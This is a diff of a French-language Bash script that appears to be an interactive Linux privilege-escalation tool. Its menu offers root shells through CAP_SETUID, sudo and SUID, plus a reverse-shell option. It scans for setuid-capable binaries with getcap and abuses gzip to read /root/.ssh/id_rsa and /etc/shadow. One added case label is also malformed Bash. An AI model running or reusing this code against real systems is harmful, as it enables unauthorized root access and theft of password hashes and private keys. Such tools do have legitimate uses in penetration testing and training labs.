@@ -108,14 +108,6 @@ while true; do
     case "$choix" in
         1)
             echo "Root Shell (CAP_SETUID Capability) : "
-            break
-            ;;
-        2)
-            echo "Root Shell (Sudo) : "
-            break
-            ;;
-        3)
-            echo "Capabilities (CAP_SETUID) : "
             result=$(getcap -r / 2>/dev/null | grep setuid | awk -F' = ' '{print $1}' | awk '{print $1}')
 
             if [ -z "$result" ]; then
@@ -160,6 +152,14 @@ while true; do
             done                
             break
             ;;
+        2)
+            echo "Root Shell (Sudo)"
+            break
+            ;;
+        3)
+            echo "Root Shell (SUID)"
+            break
+            ;;
         4)
             echo "Reverse Shell (Sudo)"
             break
@@ -192,12 +192,26 @@ while true; do
                 case "$choice" in
                     *gzip*)
                         while true; do
-                            select file in "/root/.ssh/id_rsa" "/etc/shadow" "Autre"; do
-                                [[ "$file" == "Autre" ]] && read -p "Fichier : " file
+                            select file in "/root/.ssh/id_rsa" "/etc/shadow" "Autre" "Retour"; do
+                                case "$file" in
+                                    "Retour")
+                                        break
+                                        ;;
 
-                                gzip -c "$file" | gzip -d
+                                    "Autre"
+                                        read -p "File : " file
+                                        ;;
+
+                                    *)
+                                        gzip -c "$file" | gzip -d
+                                        ;;
+
+                                esac
+
                                 break
                             done
+
+                            echo "Read another file ?"
 
                             select again in "Oui" "Non"; do
                                 case "$again" in
